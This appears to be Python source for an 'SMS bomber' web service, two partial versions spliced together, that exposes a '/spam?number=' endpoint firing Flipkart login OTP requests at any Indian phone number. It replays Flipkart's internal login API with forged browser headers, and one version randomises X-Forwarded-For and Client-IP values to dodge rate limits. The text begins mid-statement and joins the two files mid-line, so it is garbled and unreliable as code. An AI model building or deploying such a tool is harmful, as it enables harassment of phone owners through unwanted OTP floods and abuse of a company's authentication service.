            response = {
                "success": False,
                "error": "Invalid phone number. Please provide 10 digits.",
          from flask import Flask, request, jsonify
import requests
from datetime import datetime
import os

app = Flask(__name__)

def send_flipkart_otp(phone_number):
    """
    Send OTP request to Flipkart API
    """
    url = "https://2.rome.api.flipkart.com/1/action/view"
    
    headers = {
        "authority": "2.rome.api.flipkart.com",
        "accept": "*/*",
        "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
        "content-type": "application/json",
        "origin": "https://www.flipkart.com",
        "referer": "https://www.flipkart.com/",
        "sec-ch-ua": '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
        "x-user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36 FKUA/msite/0.0.3/msite/Mobile"
    }
    
    payload = {
        "actionRequestContext": {
            "type": "LOGIN_IDENTITY_VERIFY",
            "loginIdPrefix": "+91",
            "loginId": phone_number,
            "clientQueryParamMap": {"ret": "/"},
            "loginType": "MOBILE",
            "verificationType": "OTP",
            "screenName": "LOGIN_V4_MOBILE",
            "sourceContext": "DEFAULT"
        }
    }
    
    try:
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        return response.status_code, response.json()
    except Exception as e:
        return None, {"error": str(e)}

@app.route('/', methods=['GET'])
def home():
    return jsonify({
        "status": "active",
        "message": "Flipkart OTP API is running",
        "usage": {
            "method": "GET",
            "url": "/spam?number=9876543210",
            "example": "https://your-domain.vercel.app/spam?number=9876543210"
        }
    })

@app.route('/spam', methods=['GET'])
def send_otp():
    """
    API endpoint to send OTP using GET request
    URL Pattern: /spam?number=9876543210
    """
    # Get phone number from query parameter
    phone = request.args.get('number', '').strip()
    
    # Validate phone number
    if not phone:
        return jsonify({
            "success": False,
            "error": "Phone number is required",
            "message": "Please provide number parameter",
            "usage": "/spam?number=9876543210"
        }), 400
    
    if not phone.isdigit() or len(phone) != 10:
        return jsonify({
            "success": False,
            "error": "Invalid phone number",
            "message": "Phone number must be 10 digits",
            "provided": phone
        }), 400
    
    # Send OTP request
    status_code, response_data = send_flipkart_otp(phone)
    
    # Prepare response
    result = {
        "success": False,
        "timestamp": datetime.now().isoformat(),
        "phone": f"+91{phone}",
        "message": "",
        "details": {}
    }
    
    if status_code == 200 and response_data.get("STATUS") == "SUCCESS":
        result["success"] = True
        result["message"] = "OTP sent successfully"
        result["details"] = {
            "status_code": status_code,
            "flipkart_response": response_data
        }
        return jsonify(result), 200
    elif status_code is not None:
        result["message"] = f"Failed with status code: {status_code}"
        result["details"] = {
            "status_code": status_code,
            "flipkart_response": response_data
        }
        return jsonify(result), status_code
    else:
        result["message"] = "Connection error"
        result["details"] = {
            "error": response_data.get("error")
        }
        return jsonify(result), 500

@app.route('/health', methods=['GET'])
def health():
    return jsonify({
        "status": "healthy",
        "timestamp": datetime.now().isoformat(),
        "endpoints": {
            "/": "GET - API info",
            "/health": "GET - Health check",
            "/spam?number=1234567890": "GET - Send OTP"
        }
    })

# For local development
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=True)      "example": "https://your-domain.vercel.app/spam?number=9876543210"
            }
            self.wfile.write(json.dumps(response, indent=2).encode())
            return
        
        # Send Flipkart OTP (single request only)
        result = self.send_flipkart_otp(number)
        
        # Write response
        self.wfile.write(json.dumps(result, indent=2).encode())
        return
    
    def generate_random_ip(self):
        """Generate random IP for headers"""
        return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
    
    def send_flipkart_otp(self, phone_number):
        """Send single OTP request to Flipkart"""
        url = "https://2.rome.api.flipkart.com/1/action/view"
        random_ip = self.generate_random_ip()
        
        headers = {
            "authority": "2.rome.api.flipkart.com",
            "accept": "*/*",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/json",
            "origin": "https://www.flipkart.com",
            "referer": "https://www.flipkart.com/",
            "sec-ch-ua": '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
            "x-user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36 FKUA/msite/0.0.3/msite/Mobile",
            "X-Forwarded-For": random_ip,
            "Client-IP": random_ip
        }
        
        payload = {
            "actionRequestContext": {
                "type": "LOGIN_IDENTITY_VERIFY",
                "loginIdPrefix": "+91",
                "loginId": phone_number,
                "clientQueryParamMap": {"ret": "/"},
                "loginType": "MOBILE",
                "verificationType": "OTP",
                "screenName": "LOGIN_V4_MOBILE",
                "sourceContext": "DEFAULT"
            }
        }
        
        result = {
            "success": False,
            "service": "Flipkart",
            "phone": phone_number,
            "timestamp": datetime.now().isoformat(),
            "endpoint": "/spam",
            "ip_used": random_ip
        }
        
        try:
            response = requests.post(
                url, 
                json=payload, 
                headers=headers, 
                timeout=10
            )
            
            result["status_code"] = response.status_code
            
            # Parse response
            try:
                response_data = response.json()
                result["response_data"] = response_data
                
                # Analyze response based on status code and data
                if response.status_code == 200:
                    if response_data.get("STATUS") == "SUCCESS":
                        result["success"] = True
                        result["status"] = "SUCCESS"
                        result["message"] = "OTP sent successfully"
                        result["otp_sent"] = True
                    elif response_data.get("error"):
                        result["status"] = "ERROR"
                        result["message"] = response_data.get("error", "Unknown error")
                        result["otp_sent"] = False
                    else:
                        result["status"] = "UNKNOWN"
                        result["message"] = "Response received but status unclear"
                        result["otp_sent"] = "unknown"
                        
                elif response.status_code == 429:
                    result["status"] = "RATE_LIMITED"
                    result["message"] = "Too many requests"
                    result["otp_sent"] = False
                    
                elif response.status_code == 400:
                    result["status"] = "BAD_REQUEST"
                    result["message"] = "Invalid request format"
                    result["otp_sent"] = False
                    
                elif response.status_code == 403:
                    result["status"] = "FORBIDDEN"
                    result["message"] = "Access denied"
                    result["otp_sent"] = False
                    
                elif response.status_code == 401:
                    result["status"] = "UNAUTHORIZED"
                    result["message"] = "Authentication failed"
                    result["otp_sent"] = False
                    
                else:
                    result["status"] = f"HTTP_{response.status_code}"
                    result["message"] = f"Unexpected status code: {response.status_code}"
                    result["otp_sent"] = False
                    
            except json.JSONDecodeError:
                result["status"] = "INVALID_RESPONSE"
                result["message"] = "Invalid JSON response from Flipkart"
                result["response_text"] = response.text[:200]
                result["otp_sent"] = False
                
        except requests.exceptions.Timeout:
            result["status"] = "TIMEOUT"
            result["message"] = "Request timed out"
            result["otp_sent"] = False
            
        except requests.exceptions.ConnectionError:
            result["status"] = "CONNECTION_ERROR"
            result["message"] = "Failed to connect to Flipkart"
            result["otp_sent"] = False
            
        except Exception as e:
            result["status"] = "ERROR"
            result["message"] = str(e)[:100]
            result["otp_sent"] = False
        
        return result

# For local testing
def run(server_class=HTTPServer, handler_class=handler, port=8000):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f'🚀 Flipkart OTP API Server running on http://127.0.0.1:{port}/')
    print(f'📱 Use endpoint: http://127.0.0.1:{port}/spam?number=9876543210')
    print('⚠️  Single request only - No automatic retry')
    print('Press Ctrl+C to stop')
    httpd.serve_forever()

if __name__ == '__main__':
    run()
